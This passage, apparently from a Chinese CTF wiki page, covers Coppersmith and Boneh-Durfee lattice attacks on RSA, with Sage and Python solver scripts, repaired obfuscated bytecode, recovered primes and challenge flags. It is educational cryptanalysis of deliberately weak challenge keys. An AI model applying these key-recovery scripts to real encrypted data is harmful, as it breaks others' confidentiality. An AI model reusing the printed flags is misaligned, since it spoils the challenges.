0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 cipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 e2 = 0xf93b pbits = 1024 kbits = pbits - p4 . nbits () print p4 . nbits () p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) if roots : p = p4 + int ( roots [ 0 ]) print \"p: \" , hex ( int ( p )) assert n % p == 0 q = n / int ( p ) print \"q: \" , hex ( int ( q )) print gcd ( p , q ) phin = ( p - 1 ) * ( q - 1 ) print gcd ( e2 , phin ) d = inverse_mod ( e2 , phin ) flag = pow ( cipher , d , n ) flag = hex ( int ( flag ))[ 2 : - 1 ] print binascii . unhexlify ( flag ) \u5173\u4e8e small_roots \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 SAGE \u8bf4\u660e \u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016 -HCTF-RSA2 git: ( master ) \u2717 sage payload.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory 640 p: 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L q: 0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L 1 1 hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 } \u9898\u76ee \u00b6 2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA 2017 WHCTF Untitled Boneh and Durfee attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 d < N^{0.292} d < N^{0.292} \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u653b\u51fb\uff0c\u6bd4 Wiener's Attack \u8981\u5f3a\u4e00\u4e9b\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406\u3002 \u9996\u5148 ed \\equiv 1 \\bmod \\varphi(N)/2 ed \\equiv 1 \\bmod \\varphi(N)/2 \u8fdb\u800c\u6709 ed +k\\varphi(N)/2=1 ed +k\\varphi(N)/2=1 \u5373 k \\varphi(N)/2 \\equiv 1 \\bmod e k \\varphi(N)/2 \\equiv 1 \\bmod e \u53c8 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \u6240\u4ee5 k(N-p-q+1)/2 \\equiv 1 \\bmod e k(N-p-q+1)/2 \\equiv 1 \\bmod e \u5047\u8bbe A=\\frac{N+1}{2} A=\\frac{N+1}{2} \uff0c y=\\frac{-p-q}{2} y=\\frac{-p-q}{2} \uff0c\u539f\u5f0f\u53ef\u5316\u4e3a f(k,y)=k(A+y) \\equiv 1 \\bmod e f(k,y)=k(A+y) \\equiv 1 \\bmod e \u5176\u4e2d |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |y|<2*N^{0.5} |y|<2*N^{0.5} y \u7684\u4f30\u8ba1\u7528\u5230\u4e86 p\u3001q \u6bd4\u8f83\u5747\u5300\u7684\u5047\u8bbe\u3002\u8fd9\u91cc delta \u4e3a\u9884\u4f30\u7684\u5c0f\u4e8e 0.292 \u7684\u503c\u3002 \u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b N=pq,p+q=-2y N=pq,p+q=-2y \u6765\u5f97\u5230 p \u4e0e q\u3002 \u66f4\u52a0\u5177\u4f53\u7684\u63a8\u5bfc\uff0c\u53c2\u8003 New Results on the Cryptanalysis of Low Exponent RSA. \u653b\u51fb\u5de5\u5177 \u00b6 \u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002 2015 PlaidCTF Curious \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002 \u6838\u5fc3\u4ee3\u7801\u5982\u4e0b nlist = list () elist = list () clist = list () with open ( 'captured' ) as f : # read the line {N : e : c} and do nothing with it f . readline () for i in f . readlines (): ( N , e , c ) = i [ 1 : - 2 ] . split ( \" : \" ) nlist . append ( long ( N , 16 )) elist . append ( long ( e , 16 )) clist . append ( long ( c , 16 )) for i in range ( len ( nlist )): print 'index i' n = nlist [ i ] e = elist [ i ] c = clist [ i ] d = solve ( n , e ) if d == 0 : continue else : m = power_mod ( c , d , n ) hex_string = \" %x \" % m import binascii print \"the plaintext:\" , binascii . unhexlify ( hex_string ) return \u7ed3\u679c\u5982\u4e0b === solution found === private key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583 the plaintext: flag_S0Y0UKN0WW13N3R $4 TT4CK! 2019 Defcon Quals ASRybaB \u00b6 \u9898\u76ee\u5927\u6982\u610f\u601d\u662f\uff0c\u6211\u4eec\u63a5\u6536\u4e09\u5bf9 RSA \uff0c\u7136\u540e\u9700\u8981\u6c42\u51fa d\uff0c\u7136\u540e\u5bf9\u7ed9\u5b9a\u7684\u6570\u5b57 v[i] \u52a0\u5bc6\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u53ea\u8981\u65f6\u95f4\u5728\u4e00\u5b9a\u8303\u56f4\u5185\uff0c940s\uff0c\u5373\u53ef\u3002\u90a3\u96be\u70b9\u81ea\u7136\u5728 create_key \u51fd\u6570\u4e86\u3002 def send_challenges (): code = marshal . loads ( \"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\" . decode ( \"hex\" )) create_key = types . FunctionType ( code , globals (), \"create_key\" ) ck = create_key \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u770b\u770b\u8fd9\u4e2a\u5230\u5e95\u662f\u5728\u5e72\u5565 >>> import marshal >>> data = \"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\" >>> code = marshal . loads ( data ) >>> code = marshal . loads ( data . decode ( 'hex' )) >>> import dis >>> dis . dis ( code ) 24 0 LOAD_GLOBAL 0 ( False ) 3 POP_JUMP_IF_FALSE 29 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE ... 56 428 LOAD_GLOBAL 4 ( number ) 431 LOAD_ATTR 11 ( GCD ) 434 LOAD_FAST 11 ( e ) 437 LOAD_FAST 6 ( phi ) 440 CALL_FUNCTION 2 443 LOAD_CONST 5 ( 1 ) 446 COMPARE_OP 3 ( != ) 449 POP_JUMP_IF_FALSE 458 ... \u57fa\u672c\u53ef\u4ee5\u731c\u51fa\u6765\u8fd9\u662f\u5728\u751f\u6210 n\uff0ce\uff0cd\uff0c\u5176\u5b9e\u548c\u6211\u4eec\u6700\u521d\u7684\u9884\u671f\u4e5f\u5dee\u4e0d\u591a\u3002\u6211\u4eec\u6765\u76f4\u63a5\u53cd\u7f16\u8bd1\u4e00\u4e0b >>> from uncompyle6 import code_deparse >>> code_deparse ( code ) Instruction context : 25 6 LOAD_CONST 1 7 9 LOAD_CONST 2 0 12 BINARY_DIVIDE -> 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\" , line 2310 , in code_deparse deparsed . ast = deparsed . build_ast ( tokens , customize , isTopLevel = isTopLevel ) File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\" , line 2244 , in build_ast raise ParserError ( e , tokens ) uncompyle6 . semantics . parser_error . ParserError : --- This code section failed : --- ... 64 469 LOAD_FAST 3 'N' 472 LOAD_FAST 11 'e' 475 BUILD_TUPLE_2 2 None 478 RETURN_VALUE - 1 RETURN_LAST Parse error at or near ` STOP_CODE ' instruction at offset 13 \u53ef\u4ee5\u53d1\u73b0 STOP_CODE\uff0c\u6709\u70b9\u732b\u817b\uff0c\u5982\u679c\u4ed4\u7ec6\u770b\u6700\u521d\u7684\u53cd\u6c47\u7f16\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6700\u524d\u9762\u7684\u90a3\u90e8\u5206\u4ee3\u7801\u662f\u5728\u6df7\u6dc6 >>> dis . dis ( code ) 24 0 LOAD_GLOBAL 0 ( False ) 3 POP_JUMP_IF_FALSE 29 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE 26 16 STOP_CODE 17 POP_TOP 18 STOP_CODE 19 LOAD_CONST 2 ( 0 ) 22 BINARY_DIVIDE 23 STORE_FAST 0 ( x ) 26 JUMP_FORWARD 0 ( to 29 ) 28 >> 29 LOAD_GLOBAL 1 ( NSIZE ) 32 STORE_FAST 1 ( Nsize ) 29 35 LOAD_FAST 1 ( Nsize ) 38 LOAD_CONST 3 ( 2 ) 41 BINARY_DIVIDE 42 STORE_FAST 2 ( pqsize ) \u4e00\u76f4\u5230 29 35 LOAD_FAST 1 ( Nsize ) \u524d\u9762\u7684\u90fd\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u611f\u89c9\u662f\u51fa\u9898\u8005\u6545\u610f\u4fee\u6539\u4e86\u4ee3\u7801\u3002\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u611f\u89c9\u50cf\u662f\u4e24\u90e8\u5206 # part 1 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE # part 2 26 16 STOP_CODE 17 POP_TOP 18 STOP_CODE 19 LOAD_CONST 2 ( 0 ) 22 BINARY_DIVIDE 23 STORE_FAST 0 ( x ) 26 JUMP_FORWARD 0 ( to 29 ) \u6b63\u597d\u662f\u7b2c 25 \u884c\u548c\u7b2c 26 \u884c\uff0c\u5927\u6982\u731c\u4e00\u731c\uff0c\u611f\u89c9\u4e24\u4e2a\u90fd\u662f x=7/0\uff0c\u6240\u4ee5\u5c31\u60f3\u529e\u6cd5\u628a\u8fd9\u90e8\u5206\u7684\u4ee3\u7801\u4fee\u590d\u4e00\u4e0b\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5b9a\u4f4d\u8fd9\u90e8\u5206\u4ee3\u7801\u4e86\u3002\u6839\u636e\u624b\u518c\u53ef\u4ee5\u77e5\u9053 STOP_CODE \u662f 0\uff0c\u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4f4d\u7b2c 25 \u884c\u8bed\u53e5\u5230 26 \u884c\u8bed\u53e5\u4e3a t[6:26]\uff0c\u4ed6\u4eec\u5206\u522b\u90fd\u662f 10 \u5b57\u8282(6-15,16-25)\u3002 >>> t = code . co_code >>> t 't \\x00\\x00 r \\x1d\\x00 d \\x01\\x00 d \\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 n \\x00\\x00 t \\x01\\x00 } \\x01\\x00 | \\x01\\x00 d \\x03\\x00\\x15 } \\x02\\x00 d \\x02\\x00 } \\x03\\x00 xo \\x00 | \\x03\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 k \\x03\\x00 r \\xa4\\x00 xL \\x00 t \\x03\\x00 r \\x96\\x00 t \\x04\\x00 j \\x05\\x00 | \\x02\\x00\\x83\\x01\\x00 } \\x04\\x00 t \\x04\\x00 j \\x05\\x00 | \\x02\\x00\\x83\\x01\\x00 } \\x05\\x00 t \\x06\\x00 | \\x04\\x00 | \\x05\\x00\\x18\\x83\\x01\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 d \\x04\\x00\\x14 k \\x04\\x00 rK \\x00 PqK \\x00 qK \\x00 W| \\x04\\x00 | \\x05\\x00\\x14 } \\x03\\x00 q6 \\x00 W| \\x04\\x00 d \\x05\\x00\\x18 | \\x05\\x00 d \\x05\\x00\\x18\\x14 } \\x06\\x00 d \\x06\\x00 } \\x07\\x00 d \\x07\\x00 } \\x08\\x00 x \\t\\x01 t \\x03\\x00 r \\xce\\x01 t \\x04\\x00 j \\x07\\x00 t \\x08\\x00 d \\x03\\x00 t \\t\\x00 | \\x01\\x00 | \\x07\\x00\\x14\\x83\\x01\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 t \\t\\x00 | \\x01\\x00 | \\x07\\x00\\x14\\x83\\x01\\x00 d \\x05\\x00\\x17\\x83\\x02\\x00\\x83\\x02\\x00 } \\t\\x00 xq \\x00 | \\t\\x00 j \\x02\\x00\\x83\\x00\\x00 | \\x01\\x00 | \\x08\\x00\\x14 k \\x00\\x00 r{ \\x01 d \\x02\\x00 } \\n\\x00 xD \\x00 t \\x04\\x00 j \\n\\x00 | \\n\\x00\\x83\\x01\\x00 sm \\x01 t \\x04\\x00 j \\x07\\x00 t \\x08\\x00 d \\x03\\x00 d \\x08\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 d \\x08\\x00\\x83\\x02\\x00 t \\x08\\x00 d \\x03\\x00 d \\t\\x00\\x83\\x02\\x00\\x17\\x83\\x02\\x00 } \\n\\x00 q* \\x01 W| \\t\\x00 | \\n\\x00 9} \\t\\x00 q \\x0b\\x01 Wt \\x04\\x00 j \\x0b\\x00 | \\t\\x00 | \\x06\\x00\\x83\\x02\\x00 d \\x05\\x00 k \\x03\\x00 r \\x9a\\x01 q \\xc6\\x00 n \\x00\\x00 t \\x04\\x00 j \\x0c\\x00 | \\t\\x00 | \\x06\\x00\\x83\\x02\\x00 } \\x0b\\x00 t \\x04\\x00 j \\x0b\\x00 | \\x0b\\x00 | \\x06\\x00\\x83\\x02\\x00 d \\x05\\x00 k \\x03\\x00 r \\xca\\x01 q \\xc6\\x00 n \\x00\\x00 Pq \\xc6\\x00 Wd \\n\\x00 } \\x0c\\x00 | \\x03\\x00 | \\x0b\\x00 f \\x02\\x00 S' >>> t [ 6 : 26 ] 'd \\x01\\x00 d \\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> t [ - 3 :] ' \\x02\\x00 S' >>> t = 'd \\x01\\x00 d \\x02\\x00\\x15\\x00\\x00\\x00\\x00\\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> t [ - 3 :] '} \\x00\\x00 ' >>> t [: 7 ] + t [ - 3 :] 'd \\x01\\x00 d \\x02\\x00\\x15 } \\x00\\x00 ' >>> _ . encode ( 'hex' ) '640100640200157d0000' \u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u4fee\u590d\u539f code >>> data . find ( '640100' ) 56 >>> data1 = data [: 56 ] + '640100640200157d0000640100640200157d0000' + data [ 56 + 40 :] >>> code1 = marshal . loads ( data1 . decode ( 'hex' )) >>> code_deparse ( code1 ) if False : x = 7 / 0 x = 7 / 0 Nsize = NSIZE pqsize = Nsize / 2 N = 0 while N . bit_length () != Nsize : while True : p = number . getStrongPrime ( pqsize ) q = number . getStrongPrime ( pqsize ) if abs ( p - q ) . bit_length () > Nsize * 0.496 : break N = p * q phi = ( p - 1 ) * ( q - 1 ) limit1 = 0.261 limit2 = 0.293 while True : d = number . getRandomRange ( pow ( 2 , int ( Nsize * limit1 )), pow ( 2 , int ( Nsize * limit1 ) + 1 )) while d . bit_length () < Nsize * limit2 : ppp = 0 while not number . isPrime ( ppp ): ppp = number . getRandomRange ( pow ( 2 , 45 ), pow ( 2 , 45 ) + pow ( 2 , 12 )) d *= ppp if number . GCD ( d , phi ) != 1 : continue e = number . inverse ( d , phi ) if number . GCD ( e , phi ) != 1 : continue break zzz = 3 return ( N , e ) < uncompyle6 . semantics . pysource . SourceWalker object at 0x10a0ea110 > \u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 d \u662f\u6545\u610f\u8d85\u4e86 0.292 \u7684\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 ppp \u8303\u56f4\u5f88\u5c0f\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5f97\u5230\u8fd9\u4e2a\u8303\u56f4\u7684\u7d20\u6570\u4e3a 125 \u4e2a\u3002\u5e76\u4e14 1280 * 0.261 + 45 = 379.08000000000004 > 375.03999999999996 = 1280 * 0.293 \u6240\u4ee5\u5176\u5b9e\u8fd9\u91cc\u5c31\u4e58\u4e86\u4e00\u4e2a\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u5c31\u53ef\u4ee5\u679a\u4e3e\u4e00\u4e0b\u4e58\u4e86\u4ec0\u4e48\uff0c\u5e76\u4fee\u6539 e1=e*ppp\uff0c\u5176\u5b9e\u5c31\u56de\u5f52\u5230\u6807\u51c6\u7684 Boneh and Durfee attack\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 https://github.com/mimoo/RSA-and-LLL-attacks \u7684\u811a\u672c\u4e5f\u4e0d\u884c\uff0c\u5fc5\u987b\u5f97\u63d0\u9ad8 m\uff0c\u57fa\u672c\u5f97\u63d0\u5230 8\uff0c\u8fd9\u6837\u4ecd\u7136\u4e0d\u662f\u5f88\u7a33\u5b9a\u3002 \u5982\u679c\u4ed4\u7ec6\u5c1d\u8bd5\u5c1d\u8bd5\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0 e1>N\uff0c\u8fd9\u770b\u8d77\u6765\u95ee\u9898\u4e0d\u5927\uff0c\u4f46\u662f\u539f\u811a\u672c\u91cc\u5047\u8bbe\u7684\u6570\u503c\u662f e<N \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u9002\u5f53\u7684\u4fee\u6539\u9884\u4f30\u7684\u4e0a\u4e0b\u754c X = 2 * floor ( N ^ delta ) # this _might_ be too much Y = floor ( N ^ ( 1 / 2 )) # correct if p, q are ~ same size \u6839\u636e\u4e0a\u8ff0\u63a8\u5bfc\uff0c\u4e0a\u4e0b\u754c\u5e94\u8be5\u4e3a |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |y|<2*N^{0.5} |y|<2*N^{0.5} \u6700\u540e\u4e3b\u8981\u4fee\u6539\u4e86 m \u548c X \u7684\u4e0a\u754c delta = .262 # this means that d < N^delta # # Lattice (tweak those values) # # you should tweak this (after a first run), (e.g. increment it until a solution is found) m = 8 # size of the lattice (bigger the better/slower) # you need to be a lattice master to tweak these t = int (( 1 - 2 * delta ) * m ) # optimization from Herrmann and May X = floor ( 3 * e / N * N ^ delta ) #4*floor(N^delta) # this _might_ be too much Y = floor ( 2 * N ^ ( 1 / 2 )) # correct if p, q are ~ same size \u6700\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c [ DEBUG ] Received 0x1f bytes: 'Succcess!\\n' 'OOO{Br3akingL!mits?}\\n' OOO { Br3akingL!mits? } \u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u4e2a\u9898\u76ee\uff0c\u771f\u7684\u662f\u9700\u8981 \u591a \u6838\u670d\u52a1\u5668\u3002\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 Survey: Lattice Reduction Attacks on RSA An Introduction to Coppersmith\u2019s method and Applications in Cryptology","title":"Coppersmith \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmith","text":"","title":"Coppersmith \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1","text":"Coppersmith \u76f8\u5173\u653b\u51fb\u4e0e Don Coppersmith \u7d27\u5bc6\u76f8\u5173\uff0c\u4ed6\u63d0\u51fa\u4e86\u4e00\u79cd\u9488\u5bf9\u4e8e\u6a21\u591a\u9879\u5f0f\uff08\u5355\u53d8\u91cf\uff0c\u4e8c\u5143\u53d8\u91cf\uff0c\u751a\u81f3\u591a\u5143\u53d8\u91cf\uff09\u627e\u6240\u6709\u5c0f\u6574\u6570\u6839\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u65b9\u6cd5\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u5047\u8bbe \u6a21\u6570\u4e3a N \uff0cN \u5177\u6709\u4e00\u4e2a\u56e0\u5b50 b\\geq N^{\\beta},0< \\beta \\leq 1 b\\geq N^{\\beta},0< \\beta \\leq 1 \u591a\u9879\u5f0f F \u7684\u6b21\u6570\u4e3a \\delta \\delta \u90a3\u4e48\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5728 O(c\\delta^5log^9(N)) O(c\\delta^5log^9(N)) \u7684\u590d\u6742\u5ea6\u5185\u627e\u5230\u8be5\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839 x_0 x_0 \uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u6c42 |x_0|<cN^{\\frac{\\beta^2}{\\delta}} |x_0|<cN^{\\frac{\\beta^2}{\\delta}} \u3002 \u5728\u8fd9\u4e2a\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u627e\u5230\u5728\u6a21 N \u610f\u4e49\u4e0b\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839\uff0c\u8fd9\u4e00\u95ee\u9898\u88ab\u8ba4\u4e3a\u662f\u590d\u6742\u7684\u3002 Coppersmith method \u4e3b\u8981\u662f\u901a\u8fc7 Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm \uff08LLL\uff09\u65b9\u6cd5\u627e\u5230 \u4e0e\u8be5\u591a\u9879\u5f0f\u5177\u6709\u76f8\u540c\u6839 x_0 x_0 \u66f4\u5c0f\u7cfb\u6570 \u5b9a\u4e49\u57df\u4e3a\u6574\u6570\u57df \u7684\u591a\u9879\u5f0f g\uff0c\u7531\u4e8e\u5728\u6574\u6570\u57df\u4e0a\u627e\u591a\u9879\u5f0f\u7684\u6839\u662f\u7b80\u5355\u7684\uff08Berlekamp\u2013Zassenhaus\uff09\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u539f\u591a\u9879\u5f0f\u5728\u6a21\u610f\u4e49\u4e0b\u7684\u6574\u6570\u6839\u3002 \u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06 f \u8f6c\u6362\u5230 g \u5462\uff1fHowgrave-Graham \u7ed9\u51fa\u4e86\u4e00\u79cd\u601d\u8def \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5177\u6709\u201c\u66f4\u5c0f\u7cfb\u6570\u201d\u7684\u591a\u9879\u5f0f g\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u7684\u8f6c\u6362\u65b9\u5f0f \u5728 LLL \u7b97\u6cd5\u4e2d\uff0c\u6709\u4e24\u70b9\u662f\u975e\u5e38\u6709\u7528\u7684 \u53ea\u5bf9\u539f\u6765\u7684\u57fa\u5411\u91cf\u8fdb\u884c\u6574\u6570\u7ebf\u6027\u53d8\u6362\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5728\u5f97\u5230 g \u65f6\uff0c\u4ecd\u7136\u4ee5\u539f\u6765\u7684 x_0 x_0 \u4e3a\u6839\u3002 \u751f\u6210\u7684\u65b0\u7684\u57fa\u5411\u91cf\u7684\u6a21\u957f\u662f\u6709\u754c\u7684\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5229\u7528 Howgrave-Graham \u5b9a\u7406\u3002 